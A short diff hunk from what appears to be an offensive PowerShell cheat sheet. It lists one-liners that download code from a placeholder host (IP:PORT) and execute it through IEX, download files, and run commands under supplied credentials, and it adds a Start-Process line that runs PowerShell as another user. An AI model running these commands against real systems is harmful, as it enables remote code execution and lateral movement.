@@ -8,4 +8,5 @@ Get-Command COMMAND
 IEX(IWR 'http://IP:PORT/FILE' -UseBasicParsing)
 IEX(New-Object Net.WebClient).DownloadString('http://IP:PORT/FILE')
 Invoke-Command -ScriptBlock {whoami} -Credential $cred -Computer localhost
+Start-Process -FilePath "powershell" -argumentlist COMMAND -Credential $cred
 (New-Object Net.WebClient).DownloadFile('http://IP:PORT/FILE', 'FILE')
